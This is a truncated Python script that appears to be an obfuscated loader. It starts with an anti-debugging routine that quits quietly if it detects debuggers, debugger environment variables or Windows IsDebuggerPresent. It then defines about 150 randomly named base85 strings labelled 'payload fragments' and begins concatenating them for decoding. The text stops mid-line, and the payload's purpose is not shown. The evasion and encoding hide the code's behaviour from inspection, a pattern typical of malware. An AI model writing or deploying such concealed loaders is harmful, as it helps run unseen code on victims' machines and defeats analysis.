#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cmxZq8SND4IrF7 = '1Q^S4`!PgtE+ah^Mlo#cv2SNw1FnahrJ}GW0tR9MI|Cm)7crTA)9tjdT^%q>*?f!>%Uf=wD=wV~P'
_cycoquuB57vfP4 = 'HN#GaTbujPg>WXx6Vs|ou~<9vX0H~c%E#yh{*yoUF89;tzW@7)MGeqFw0o_M4FZwjf}q7U(C~7f$'
_cs_loeJcXMyaHY = '?W?C{<En#jPvjU!4irsSM%1PWJzdd!qrVZcZ?e*%0w}rC*r|R6o!4HfVGUqs01>R6ZMm!9tXT#Bg'
_c_7zS4ZPP2o8PL = '#^SpzM1{O%jO9UGx9SbuXDnWE=I9<hXIks;8qfB%yAftS3%;xoaqHbeG=d}|2wAunflOHMaFug>@'
_cwo3Y419dDkGyk = '2x*ns13O?M~->|w~GGpwwiqVSHINe8?+;|xo*h7cYa9prcIxBEy&w~94_bXeljiDDDR;6w{a^0pO'
_cjn354EeAQoMmz = 'UOczb`$AF2pwr?m3@LZMct~68{hQCmt!=rPsI@%}{FP+h;>J58G269<UT9rK|KCsnS;rh@89#1x#'
_cc2ylqxHpJIKcM = '$M)@W#y&}8i$8zi3#I$3VnAKA6id3y6=C%;%<}~7TaX(538>6fIzgVNR!nUtk4)CP3FHKCA3&Lgv'
_cevDqs3tE9Wnod = '1NcbMH&U-_%v>7KG_q^8q*Pf!iDG1WLSgPGk1L=4T1?)Ozs5RrX>*`V-~f6@*Vid;Ye7``ZNps0|'
_cq_6zQngSngMea = '{8iVj1U9;qB<k!7xllmz<F%3;181z1!oP$$-F8fm}@Dh&Um*}AfrdTd|PTqnK1k6sxV+NXiO9MiN'
_cemHaXGo64i5L2 = '=H0C5|e5rNrUWuwRK&yK&p}%<S-ah>kx4Zf?h@hSLm5xO`F<0#d=gj{yan$~;C%#Pj-H<n2VSH~}'
_coOHcGw3CJEsN2 = '68&2EuarNH#0Hdk++tj$Tg|buCE>MzD49y{5x3=}@^1}Qq+xVEvlYMs*uiPaf-Fbu#R{;fj=bFqv'
_cr5shDfeo4NR6d = 'C>*BmlGtV;XK>|F<gjHuX(avTe4n`WAXx<opeJ0I$&5~LwE;lS!76h6{;uKOL6^BVR<71;giG>`F'
_cqWNcfAhVcRov3 = 'Ph0)HmYj*RIx|ViY@KEVin=S{TptVwR5mX9{TN_QiPQ**$j>iYTfHDyeXnNeVdzQ4=m~?XxZ=Gcc'
_ca7eIH3jGmUP9B = 'UWN_^MA48`-WuP-9jtfBA{U+n<j*eBr_%1Q{jlJ8QI6VW}~xlX+tJcR1sbwC9~ZKyW<!pOB8Tw#@'
_clcs0LwCA7_PRk = 'yt~5@J7&DY9s-J9Bo+jTLHnv+d!5BOI816(Jo0E?hdAryvXpQgid%phku$@+<oR`b<k+2S@?Bduu'
_crWxRhr6BBSLUr = 'wTqX)hcjbhrSArp&Scd8IN4~F7YcD7KZH;rQ))RkF#yu6KP>WE=QnpKD7ntq2{N|f#L>hUq=gPOE'
_cx5wZAUvJRdfjP = '{6247Y@9Yz?R_6%7#=nY$;-8w@bYPf#-$sn$_@)k5bt%ZExTTHVAW>o#g%@p2_O;@3`c-l)&aBQR'
_ci_YlvG2BrUrK1 = 'GG-FwcTIlkL`wJV8Td{XOl^fdPY&G*8{cy=wzTseukJuO{dl)m5};ndCwIyjee)uxJPSbm&v?KUb'
_c_ZGT7iXDFe3FU = 'pdlW0aUs^$gJX^rOXEHw<TT;m4Xb*wd!mXr>c7*8Ah2rGfWevj;Rsj`~Y$%MGHV+d9n$VL3@FO*R'
_cdA8YnaC91QUoq = 'jVy(ei)+|sky>=!b0`I3E!*XNvc(1j9*Z<UwNNy~Q_$~{BX|jpw9i~o^jKs%Wgp*pTNya=KZheUw'
_co9JLADvVGfU0f = 'c=vGs2*43Fbr3wB%Ug|E^^HP*W*r*`sjxymsx0T@EorLbXB3QF-uTD%4wg^OdY>`7+8P$5R)|L+W'
_cfuFxVmIt_o3H2 = '++_v(J-Pt2$jo?e%ZKk3Iaq#az=b&HWsP7VT&PMN(Dd+DO|mlJn1>nhxN#Ju>UFSX!;%pVpz2A>P'
_ccyLAVF4NkZ3Up = 'br|kQ&mWK7D_!UKm`-O3xK<H5<?|#3-gAUCvcf`*!@~YQ+TlTYkjFqV#!67ztuAyNbU1-zv>?5dg'
_ciD_cgw2J81C29 = '`krwgg2I*tp<-hTgojzmb0-&{0J!~LSqTH^WoNb)y~_b-j=wwYGeiZYhB!SN!&sezOTFpnnq?N=I'
_cwE7HgT8U7SX_3 = '7sDH@`(r&ZM)_0k@mcM47+n};KQt{UFg{(_xRa!yKUmOk-o{{;jnkaXx*F_s>*NRHCIrsILrLI1B'
_cb4LgOqphj4of0 = '23ThfWD7<$k<8~`7;T}T+pKQ6Y}~Ij2(aFkr!K{jBVYAhRNG;l3i~E0K<9`!k<AW)6cTO{G7!G^3'
_ce5B6jJSre3F4y = '3_+``LG9EVxcs9ien1<8Z$CXC(BI8u{OAjbn=e9@_14BXHeh_TtX6uHe>Y}_>^cB^g@^<vbaSgdz'
_cfdttFdWp52QOI = 'vvqr@ZKa`G}vrKR~4zAaen9e@fw#8hwa27Ee^t#r1epr;pZ6UAeOwv;$G_&&ooi%&`*3QL0eY2N3'
_cjyPQ5suZafjX4 = '>-O;T3uQLnX<bb5aIjIr*K3#AQv2Mfa*@uPcJ@ghuV)9)n&lLW^W3k%qSax1{r|0dEZM@XO<NaRz'
_cuifOee929IBP6 = '0J!!n@kgw8ElS>g!GluzD`a8f_!o6Kcbg7p6%mOg}W>YS>a%})VKSie4e66y+N`!_X1I*fVi}PaL'
_cqLznIDI47GROD = '(ci@-V2=g}S?w6}si(V&0B(^g#&cmrQzsQ6C3_x<M8hZVUJIhd7$2-*5#<+7?4b0>VpJ~qeb8m?C'
_cy5auVmiz65DXH = '?9)yTv<lN(=U!k>QM|89sVq>O_*!VxEN_NNYED0MS1$ZS!yN>I_kF)?&6~^S<hD@Aw%N-))g8w$W'
_cxIv4VaWx_85dn = 'xy_;v?+JFd%hsw=IhRXZ4I)7+ME~=&saE>iAo{A)tlmoVbP&Ar3HSd}Fxc<#w*F{1iRv4g+%6CQm'
_ceUkuSQUts9oPG = '`nNhE2#KiJruY!sPtSo;#^UY6G%Dd}(^T#xud!>HDxMinGpFHN$Dt(Lb@Rg;k~XAEe)@3Uut7`dc'
_cgU_Eay2Jz08AQ = '!-*<?}cVkzMQ#9W!0zJl+#(LTGTr!b5n$Y?7sU(ye3hky77U=Kem^?^XtTtpBLlm_*-R4PcD7H;2'
_cun1uFfpL3bp8i = 'H1Z8(S&HeWOF?XJ^rG?;hb)|8|C-Vw&6>KnM6L*s`??YY_@$(gDK_A~Q*V}J@BXlS&xOZPbMEsBW'
_ckRTeQDjfhCKeG = '(HRCIWNnNY!IK&Yt!IvY%qju4S5{7w<Y=r4O%}v1H~>uSII2f={GAv=(n~f%{|HB++3*Y3Xet9cj'
_coh5InTQ2B33sp = '0vgTrf5kPbHy6V->DGL4g4hxl*;u_U~CnIKI2PtP%QK2;#7zIP~M6-gTlQW(o+m(sO|Dg>WH}2{h'
_clx9tdG2VrnTTp = '+uS^i`8AYs?)KP+p7m%oN`M+quXUbl`^Z*@`xE@89uTWx-xc-Y=%oR~fod$Y!*110L_egdmPmF$5'
_clQlkvuWj6khUC = 'nzw794Sw&_PB5e?d^|7J<ZcdBhts^?R&fb(daez*2s<XS4M}E*r&h4v^6$V-QpGGODwEAx*!TXCQ'
_cgjMJyHQSauJKg = 'o^=~9<4WPekJ5g*Y-6g*a^ucr+ekuV<Q)JYBXSkHTisf`Z3-F=nJv(IdYkcEEVych%FgW_R!xd}j'
_czhNZ3U3EQX5nJ = '(b4M35GSP8$X$=34bX9U4%oL3QD*R7yg8f;I!gPYSMWQyBHk7qgN?OWX8AniqAiBqZP%KC!FNz(E'
_ccHVZlIV7VSwtu = 'QR6LJsia;v$MsI`oCf2E1!L#I8ZBOl%vz8V6e6_2|qM!TcG{H|qvMDg6Qve>!|(Y0sWxap{|SXF*'
_cpTFYPsffqvGQy = '~lUh?D|_J1|qz4t86EoJG)iJ41&L>bncX`8!%=FF`$u6uqsQDRFEbP|ncDrNb^8I-Uw#c%p7vc49'
_c_KkLHjCeBvT1D = 'Ua~U2L9Jd(EZf|nw+g=R`IJY_n8kP?vNrF-cJ8CMUgtc=**DS;e(vfX=l3{4R-ZMZITAjq`a{Vu+'
_ckJNvF_PQS7eJM = 'H&2{FE%j5$;UKs0FM2y5-CvY4B>3@G#4%=wx|9Hpmat@#p#;<>U|VNt$xp<n1F%9rQ)(Lx&`|HL#'
_cfoin9Fgq8Qk_6 = '~|aI(O(>E={`bNlm{BXt=|RZJ{phEKO~lP7P{K4x-XMt<9VZ@yt#GHu1b$zO(hw{jrquN)1i7)yq'
_cz4zMNgEXA_mK9 = 'E!Ls<sCDDPVV2ydL|x+(j(l%sLE=_l-I8lsiED^3tYg`+H&o@OZZf)Dh5ZJ3fMkKO0MV$c{+pcV?'
_crQZdpKfuKVQMu = 'foT`qXzI-L}t_e&mb^8}R)#2Cuf+VeygefnI2tJMl{#`@r=POhzA?fh(xqP3tbkoqUZ+vy99+gXC'
_ci_fCJwK5x8LHP = 'SJlvZ>51_~Jm&3zge*HwUn|ZGv&*w93y*Ni`k$m;%pEmyw`1t2*wFD8xIIv|Y>l_h;-bzo*dD?wC'
_cxLxKzYUpkdgpN = 'HCCHv7cv<&b|uNPoZ%LOOuKU588*JY8l;8!+s`|O>??@dg`La*%;}XG8@ao3o1P*Q{q^;_xY!mI7'
_cgTw2UNRb_lE7T = 'Ud(Lm*x9E<*~>d#)cCo>;3?k=@rQHZ@3ksT)(893+&$%V{K-;8>-*_Rb=j?d<tv<?Huf@ronAw+K'
_coUOJqEzr8wpNK = '_U1g8frRR2!x|yQiR)w|3e}y|wIE`r&q?rAr1sC@}~oC0<8P+`&D4^E<Ej*%;nUm8Ly|w0xF}jZO'
_ceqawP6XPJJ071 = 'EIyT*IT6rCv^cb>`f6b`;+-jrn^UUe@(m(G9Or*0XUp(>S>c@?G@(J?$3PrLyykC6B}H!`%Dd7La'
_cr1K_h3RPdpwpO = 'V@M}HW>-!K`&K@Wa@7MD8=0m72=?PS7WAmyzh=kJpLHG^{8UWLcxw|0qrdRCzUa<mMP}D$`<4i4W'
_cqcy3s_dEHNyj7 = '2&Ho#V=K{bSK#&m-kyoRJ+`*2Yc*CpArQ?9eNG<Tc)Mnvq%gh2A~%I7*X#2k_2buck^VXqi2qsO{'
_czB8oVl2AU7kdr = '&SYBf93?H5ZH)_XGpTFK}(`o0q$TGum6lG=jdLDcsO~%Z785bg}X!C<d$A@-Z0!EW-$bQhFNM5R7'
_ciT2V7X1hkba_1 = '5=KspRy4w>`g(U`H_!GILd~fy#9Osz>CN8FrZY;}?1ynJ7ypxDnFdGMnaWEnXc<2J{5DY#JHW0S('
_ccND2Z7LMvkGTC = 'B|V<lR6bkzK|S;e5$VRv?g9y>z+W#)sX9;yhCsf8qh?QtBy^E-6~C7YzFB}pP2MFw56N9L;Ebd$d'
_chuua4pERDbbEz = 'pqGt_g;%6G=w_L=l5hp=du?^U;9rbVcWo6e%JYGNA0cW1V(ejoty`Uz@vHNPEEwCuKyESlD-;0(S'
_cfl4F0aFs7wHFl = 'cbfH&|K_kRE56@dTNR@cU(fz;7)j)K!N^b|2$NXyRm?Z0`k_StVY%DKWi5Ox&bi9e5!pc5cC)UHX'
_ci931Sj0ZUdRVF = 'fr)IDm94x*E+X{=<g)h7N|Whvy>N9&#;iv(Z9;3J<eqNHxFchNf$KXtt1i3MOFv*24F@q*DxQvyl'
_czYGZoPvlZeCsE = '(-Wv^-4B=QJpe1v?rO6fz3*P8W_O{hj=;_SuOk@Mvdo`v+atVEg00*a@Bh431wUytD{!&WS$Hwx-'
_cyaJpBUwpbSMvW = '+*&B>jD8ask2*#(3-h_WrAOFiiHBzAvkl`)=yCTB23yv`XeU57_Z@P|@og1bzum4?f$H0FYmsvU@'
_cfzY8Aa4D30RzV = 'NS7h1uMF&9&+2J(rVCU{Rly0n?UJ;C-QW4+|-lD?^x3r0m{ee-A43l>d2$gg5m-6nb0m0R_ffp=k'
_cqtqVA8qD_D35u = 'F4?xU_2qHxf+k~FyaCK?ApXECxq7qkK@c&X3lD$aI~~06niU~@RD3!AfRfRV`dU1pwYl?f!5bW7C'
_cqaLaCDhGi1Qwp = 'i%{N^)^se`Sx?2tYnlG5G;0v&Jru%Qm+{pTGE(XN7WjiTJ&$|=UVI@;yvw<>tY@&h)B|a6D)6pL7'
_cjcA8WjETJljEl = '_2;Y4Fkf1}Iybd0=KddzMwgY#(X(^Y+vN3G?Hrw#nHAF2lV<Y_w0&fWJSPoMw+NervAC%^#ThqAj'
_clEAdL_s3e8FLb = 'sFzf0K^(Hrh8VrCZ%d@<Yn&)XW@X=fa=L``wEY`dr52)gE8pQ5P#?VyLOSeOQ=7ja?&ZZOag31A%'
_ctfmRhL_2I8jXn = '%ns{S<s4u-vJUddKp9@`yRc+)`qqW}{^2@;{(n@uNdf`+{%aG0R!jdUli>vN+V)LUH^8SiT>z2TQ'
_cut2YUpSnXKoW4 = 'S|;C1B0YgFRDlMYn}CrZlo=LB4UxZ^Jx;l!8+YZto5N?VhHC%tzuk(F0jVAPF;e+aq(IJ<?qLyGU'
_ccyrjWUBrEWSUu = 'H1_@E9Go>L1*cMPwZrgxgP}=DhLoMPt$~DElTJ7+5e9dWncO!X!RRPJg!PNNJr@&dcz?owSZh`39'
_cnfOtJ8CEbuLHG = 'K8RmETwU1lYDuqebqaBTkbzh+Fc=?$<-JGo_5SZHx_SDY6fuA;C2J?LkZ2vi^{90jwpf%UY=C`sw'
_cmuAklgkHqGZ30 = 'cVQ0su%;1d?M!xvdO`ogtgye#tP>K{(5lnJ!6Hk@nWUP2o*3?<t9@3VR>%V3#zR+c;uaj<EdRja&'
_cgnSlBSETeDHH_ = 'CC5c+@hDeX8mmyteVJxfp=lM_q+wnwHXk07*CmTy|dUkp_n0&orA0b0Dsa}eeJtsKvO8@Ka6PVgw'
_cj_67AX4kWOjKn = 'v-i1Zvkb)@U<<E|gQANI#XChj7Fqeeq1t&pYn_h_Yv0!rB-~c{I8-NiCksKhdH<k)@3vj8VfSgwV'
_cbt3wwfvtnqRBd = 'NpYOs@@3qz=tSy{|>zw+^x6GNv#@JJy?`-<pkFzM@AaGXfx+8k`n-W&qi+!8uRPS#k`X1;|ZBELZ'
_cgXbvyD6h6sY39 = '&nNcHe&$8B*X85~ff1nelR_E_KZWlm>&9wGaKpk>--H;PHuiGRG3tl5(9GIFq>Hv*)YXNvr2dAtG'
_ce14MJtQbPl4qd = 'qLD)1aw-{wDr^5fA8t#&7j`_-S%7jvC<j*^a5+V+oDKbBLub9HcKK(2HF%j~`1n5A8R!>Tr8>^3x'
_ceLgxFZNfTdXZM = 'S!ppjZOnQn;$ftIvxYhw=b8j`y)r$wa0BqTD=Jw_f@Z*Uubq4-z`<ezf;OxZFRvR!bcxEoV-SPAe'
_cuGceZ3kfj1pjy = '++&p_9+0zqwzjETGqr-s?p3@_0%W?Ju@#N)d*-qb1nyHm+{&{kr+iu$Gf>C8W6^Rx(7^o|*!Ut-k'
_chXX9Xn5QX4BA2 = '?YQ+B(Wjmof;9_3SUphLE^N#cNg;Y8w;6qDjTnOlKNiRh9UXu9b3ju%zO3H`&-}IB3oI2TCq<Y<r'
_cdiwJMcJPurVrq = '}X>Gk_3Sbgr=mNDXi&bBFb(K`a;yRxuug%!s0}JrPn90mu&8%f*%ihBJaJJ^|wZ;;4OSEF}M!9kS'
_cde1MzGVs7NHhl = '7Q=$WL)k(xK13piQms>?Xerv%Q6!!46647NnMtN|26zo*4M6DOnOB`uR9QJB)Y8f{Z#j(v~@@sIx'
_clS1pHNUExmOux = 'fht(A$b6sy*7$Anmvw;b^*PXXRt)<bvz(i`Y5z)Sp_r?)`TKgxBGI0+?t(63b^Rg+~2{*tY2373}'
_cc0pHU8wPXPSQf = '7k5&Tv3QE|CTHsW|KWr&wg<)6&Gy@H8plos?c|yU(TM&8(W)lB{?eHnXiYL10WX^QU6j}&IhpY|s'
_cscbBYL7oKssx_ = '^YAKf8fQ{hO$xTUEbRUEjy;8*+LL`XrtHTC!!3%mY<_CvB9lGni<8w!<slN5k<#cpf+I^e^z~L4}'
_cpIrWmiiSDy9dm = '<3EjIIWdUQMT0V{hlOh={o}S?DM%vCQdS_KEDQG_{G-!o>uXiWr6RNxg93lQ(Gk1^O&e)b4Buh9A'
_ctnhGtjlmN0b3p = 'b|UsE-cWm%T`+iF+&iz|t2c=+ov&vRYlJUnj+l5XNefanpmzC^RGFJlR6$+fH8nw^RVZar}CFU98'
_ccrwf8Ssauf3Xg = 'Vl))Xxuw+eD&z}~#N(SAV6Fbq>?=j#*f$qZNuYWim!d?q~4<F6o36j<+`5LCHWLeM)-P3B5Xi|XK'
_cbV164d3eAgzTt = '2mOuKl9t9>Re$84v|>?C9$S8ExkxSU-f#qtc*ow86W3B^aRgSUp~G)Ef8J*|ID^dn(z&t>dC1hjE'
_cotWcSC1tUi34y = 'QCEi5DsKAUXnG=8Q9z~mo0rt&v$ENjt{t`-?!zDLgI4SrMiX#U^&|njyioTfDFD}02<=e<hz1Ay%'
_c_RqSaSeRvyr4d = 'SD=*FKT7|9zfX3LE-*!guSy&1k_03+)dsBdg*+OHI<&dxTjE{BIL>;>c4@VQl4ZJdm<OxU<3v@bj'
_cemqGGxk62foMP = '@X!BCU848ny{2Z`ia`1}@fF<Fi{_QHG80zD{6FcV7A@SzkvGOWB5DVbj5T@}?Hd$=*I=jM&gzn@s'
_cr2pE8SLMB0YRD = ';z&|q3`X|Te{YC^|=<69YGZ*0hwMgL{lO+{TpVoKT`3G!(uhrMtKut!}px+?ma#~2q2UTZ%^QM1('
_cx7e5kMxvXQMTz = 'rIcZ^_oRN$vTWKJ=6{K{Gi{L1zShSY9M?V$lbA}C6^2tk13@bzysHPt0_mYQd$%hJ=aYwYGdoQrs'
_cbG6SKIt6zeyvZ = '+gf@SO@)duO4&H=J@{btp6g`H1owB&g-c{-5yjkQoj+HT)A|OheKYqV;BRg(b8IN6=@P4gzk<6xZ'
_cpC72amkWGhdpv = 'tN^qfuJ7znF%PC*zF6q#t*I^%neC=gi0W|4h~0<89Ulp!+Ub$7AcxEm`r^1Le6|sIq<l%jZOB%`N'
_cpmng4cPMni2Ih = ')jnL6Zl2x$LI3cG=d)IDwA-HW(E^})^WTspH(7wXqapfSS7<EbCHWdq_zOqe9YzR*|XJfs<ptY$L'
_cmxlA7Py3TWeae = '$EyxK(J^F}sDD+*}HhJ)5R&MsEs|ZF>T~<^suXPX)K6n*)IcX&UI{;Sg1xHOl`SQDtw$T0kAKVw+'
_co1sYa2JWRGxuj = 'dX!GR|1R&TwTg%OOEU6Gzw3^vSk&R%b^csGD7WOjWm{5FU;8qh>4~1e|Be(&#9I(l9QEUO5(Bgcs'
_cabzC35bM8pKxh = 'B1HQHQN4%zbMw^Bs41Go=AV==S$&?jl!#kHHW*>pmu389&Ls0$4=f<(}+IS&nc305sB*Mj>823wb'
_ccMG1KKvOy_BiX = 'N92bixpaa}x9xa<YMI1&<$6qN}@xS*OE%5u2UGY6*^S_a|LCY>ZRcWv-b9_auROZ_oX4P!8Y<cvW'
_cjcpAzY0rhZVi2 = 'uJn`Q99n?5IizVlvH(M1kvw>No2U{v17AXDAHdqR1zTi-?1GYi`I&8KAj5WhG>YQZv_(!z2@%|9F'
_cxBIeG3cXjMHfI = 'U5jeu{H0pIf!^u2r<IQJjqeCca^RhWhGkqI*i6=@wvu*?XhGtv23X7ynf*iFe%q8H2qX5uo^{nD4'
_cn4vpQMeXeU13q = '%CDq|Q7g(lhONVbpX<wJRpuG8809%fn@q}H)xKl?0SPnw$Ey=Qr_C!+Eg2&_s6@2ALz0O9IU6q`Q'
_ch86bRTFo9jqza = 'CWY?4e3nGiS6MW)Ln!b6R9?hiIj8IV3osm$@lG_MOOcLGe)M2YpW1TB-T~`rfec<T$k4PjZj78>n'
_cizPgCaqMWGqNM = '2bb`lT6Q-8spW!326omqpem>rAXc$U)=Lkste{_<!&XWJn4$1jgsG?GW$BTy2ZhN3PC~Nd<deW-?'
_ceGzSZPlaqCvxV = 'PYlmrLwy^b~5&r%ocQ$<wL++DHgNK(BFs?$?Q+7x=6CdY6g-UdJM+V`*cav`RxN$XUIr$dhu-Bd^'
_cua_aJ7Z6NhBy_ = '3@<%-2w52|A#tnY;yu<LKoU2w0)to0$!7HScl`cpTs)3Lji2*gZ%1(E_?XUxx_7EuC-D1ZIt|r-X'
_cgVuKJN73BJuTL = 'J3dRh-a3pvYIKE7p1J@b!{6yg)^Q9m^dMB-yYr!5R?I1{r>99FYM0moJvOa~Wj&0dn&$rWv2gPh?'
_cj6IPejy4WRbLR = 'q4ko43+Xq&~C>Hz|ex)IY7~fKL+<3WluIjfdA0t9t)&O(Ic&~TuK#!nw3<(lw_TO%s`^_9K7J?n8'
_cy9aeALvrFcB6Q = 'Z+v!qN(KmD)!7PG+QHi;LW9QG0nCjga<)9KghqU%7U{U^NQ)a>nn8PM=;-MZ?q`)s?JIKopJB`kD'
_cnNdS3O2FRZKGx = 'r_C>AlOwOB%W!ldjB2Boi7kN%lcdX#pF&aw;qJ4}D5GladZ%LMJIU7J@u7O_~xPNMLFqBmZ``5Z%'
_chZGvdIBgTp0kp = ')4xn;XUwBDe?Mol!LV~>h`xNjtCMK%q%@wH;Ds<|dcbVJ64q{es%3UQhu3!L*Ew0PGK*2Yr@wpgG'
_csg5ufLLEAaaR4 = '804I7EA!=CC!RN8wViC~`fH9d$iJlPwVzx?&MYtOe|-92t|L<nSvBaIC@y3JFmPKJDZA)_Fbl#~E'
_czLuvZCy2lBg76 = 'ZH)}wVjs#jQn2Z4YYK|JL9`ymzcdlDY##Hfxy=fIo}L>Rz5Kh2O?ue)MfVFBM5FC!tZr;#R+B~OS'
_ccIzCBsYLq0Gip = '80ewg&?vmF_6}7vb0*$U$}{s`9$R^8i3<uWlJ~bg~R*?<cg@W6;!ESRw!j@xZQG9vA@xMo^$kn&{'
_ca8LY_9yUFkxe7 = '_789(KGv^xwLN5(SExjCuW^{Yc)h!QyAZ4uk<$$Z>{7#I#@D`xS|hXYU<d2-QO*QN^ZG+0o2fxsX'
_ciMbgV5l9GHz3L = 'yn&I|iDtBJ8ppBrmW<$0Ulsp3>Bocp!_I4oyt}Q)OeXWV)U_gokpUeRsb2~>OawxU^Xr}w1odqhX'
_csyWqQKX_YgcBE = '=(4vN;IfR{p18!|(oI#(PV|olYH|X4p7LIwr^Vnlt>fSFymvEdG7Lb3^1h$LRRAO`TY<h5Zzp5C7'
_ceSMF0Jko7WhSu = '@RovA(S0n0JJUphrZk|IY)#gOaLNsw6(T+dMV6Yd+4kb;Tn`I#N^$Y^%sI4EfkPpN-kkUoPF%Zj<'
_ccuwUjjbQfDmVA = 'uUZP+;V&d@i4<V`+#X%VMqr5nPV~!)0}k-|?yczAI7MP>(CSRCF{ZGc{@?>+KGR%HmxFYNw)?aBC'
_cfc9vmObqXmn6U = '}Ou~rX~^G1IHN3Si%8~T0epbb~MBgSY@nxwPuIyGyvvg=f}tbu!gc6&*tkmXuTt{Sznn-u!3ffwN'
_ca0yJuMmgDhXqY = 'X1C6ZPfo8@ok+8B06&#E6D){pQ&92Txj2i6djwGDxq0RFR-Kvv|R<9#qxvJanfMcO|PE`XyCUny-'
_cjD7s3OMry2OZU = 'h_x4bqb-7<`u|;{xqKxFOUUj-ByWVT;^?f6!vnh@JY$NwR=;frccSQ3<gtEUa8$=B1Q6tM^L^1S6'
_ck6P6MP2q0UGyP = '3rHxLTM%<$c$k)5z2zEQt=Gq11rsE%5%wGjev_gC)>c_r9@1|c(yKM!vXp%ykcf>wPkC43u-7(nf'
_cnYcPRbfi2Pp0C = 'VkdOYFabCA*8XFdSW2cC5!)rIaFvh!fomcRkIeR0B17&HREm+15-xO<kk@Qck?^#C-}jyV{jx+Tb'
_cu9qC4aKlhM0VF = '|bJz$D-x_1M<$j?96x9rOb_LG6gDstw)Z@eY;3X;E;zPkT_weU|!zW_^yDFTF*&IcGgG%9^kMJ_R'
_czAByG8bv97CkM = 'onzD;T+T6t}!#P}I_(gc9P{@xzOZzl3Rz`KLo;{wA>CQ0MSrT`}02FH;7TJ3Q<lH4x>1tH*_RA_$'
_cmIzDtRke1xtr0 = 'DXoX0L$*Mi-st}4rPS3!8g#JBjXTSjQ%$!`t2xb_p+X)x$WGfaMYfhOSgS=U%GjvAXswg|GlsX|_'
_cqxLNS8vUFrlzM = '0S)Sq=GJ&|03OL_r=9kQv<+l#mhFI$Vz}2J+MOaWk^C8>rf4c`q)q3TVI_RGM-k{o%oDDH5&8z$O'
_czWI39emazz3Gy = '8P$zfyWXtD}Tbl>{c_(k{%S&lpzM2uXrmQM8BCl(9Y+b67Q*eM@)HYZnBf9nP9Aqd<0_Sg={JFf0'
_cgoetVVttUfNOI = 'HR&gb$@S=87uiRF+BE*fI29aC_y-#28O23Dr~MBG#K0Gk39)cU=_GQgh81nKK_V5QmiZk7^n_-j`'
_c_KJYIs08FgnE3 = '10Wy|m_-Z2G8=d76!CL0AhIUM+O{Vs~!M>Rci%^`!7-MI8tCx+h^F@vOwbqG(%3?OZZ;e63XP`!C'
_cmMF171QlBmw0P = 'lXyPwsjt~ae<BFpQ0UM)<GSPQp-MTc-d{$)EVv-OoWf+xs*qZR@l6C;DQEL}jx02?qbd?Mz=XX7e'
_cjLJ6q6Ochb_By = 'N8e3xn>4`C%@JUjDx*gi7}8jUz$j!cq5uVid2`Hzh`fcEkb#CTV*$8y2F%MugRbj+A^_L!TrlUTp'
_ci65reIlywAaIL = ';86Fru9A*N4hW<Q%^|p~R)hvJG}sE8$X#ZtP)3Nzme+Ua^EHR%Uf|An%t4gbEbdhG3@RY@`4=s=d'
_cbVLQztbcCRblg = '%Ebm5H3T@Z{VB=WSgUZ)AF9!XSjp}^J^SQCAO{PV~$zl#>dwe7Xr1V<NZgX20^oF&<qtPJzo7|97'
_chRLdoYiWbhGUN = 'U)Rt1KV)0~vT<Atu>bLCFlGu&>W6(`3A@v+%$wx$rKb5~yObg3oAG18XBg{ZrSY9c=Eus9>Ed'

_pn32oFfQSD5lHu = __import__('base64').b85decode(_cmxZq8SND4IrF7 + _cycoquuB57vfP4 + _cs_loeJcXMyaHY + _c_7zS4ZPP2o8PL + _cwo3Y419dDkGyk + _cjn354EeAQoMmz + _cc2ylqxHpJIKcM + _cevDqs3tE9Wnod + _cq_6zQngSngMea + _cemHaXGo64i5L2 + _coOHcGw3CJEsN2 + _cr5shDfeo4NR6d + _cqWNcfAhVcRov3 + _ca7eIH3jGmUP9B + _clcs0LwCA7_PRk + _crWxRhr6BBSLUr + _cx5wZAUvJRdfjP + _ci_YlvG2BrUrK1 + _c_ZGT7iXDFe3FU + _cdA8YnaC91QUoq + _co9JLADvVGfU0f + _cfuFxVmIt_o3H2 + _ccyLAVF4NkZ3Up + _ciD_cgw2J81C29 + _cwE7HgT8U7SX_3 + _cb4LgOqphj4of0 + _ce5B6jJSre3F4y + _cfdttFdWp52QOI + _cjyPQ5suZafjX4 + _cuifOee929IBP6 + _cqLznIDI47GROD + _cy5auVmiz65DXH + _cxIv4VaWx_85dn + _ceUkuSQUts9oPG + _cgU_Eay2Jz08AQ + _cun1uFfpL3bp8i + _ckRTeQDjfhCKeG + _coh5InTQ2B33sp + _clx9tdG2VrnTTp + _clQlkvuWj6khUC + _cgjMJyHQSauJKg + _czhNZ3U3EQX5nJ + _ccHVZlIV7VSwtu + _cpTFYPsffqvGQy + _c_KkLHjCeBvT1D + _ckJNvF_PQS7eJM + _cfoin9Fgq8Qk_6 + _cz4zMNgEXA_mK9 + _crQZdpKfuKVQMu + _ci_fCJwK5x8LHP + _cxLxKzYUpkdgpN + _cgTw2UNRb_lE7T + _coUOJqEzr8wpNK + _ceqawP6XPJJ071 + _cr1K_h3RPdpwpO + _cqcy3s_dEHNyj7 + _czB8oVl2AU7kdr + _ciT2V7X1hkba_1 + _ccND2Z7LMvkGTC + _chuua4pERDbbEz + _cfl4F0aFs7wHFl + _ci931Sj0ZUdRVF + _czYGZoPvlZeCsE + _cyaJpBUwpbSMvW + _cfzY8Aa4D30RzV + _cqtqVA8qD_D35u + _cqaLaCDhGi1Qwp + _cjcA8WjETJljEl + _clEAdL_s3e8FLb + _ctfmRhL_2I8jXn + _cut2YUpSnXKoW4 + _ccyrjWUBrEWSUu + 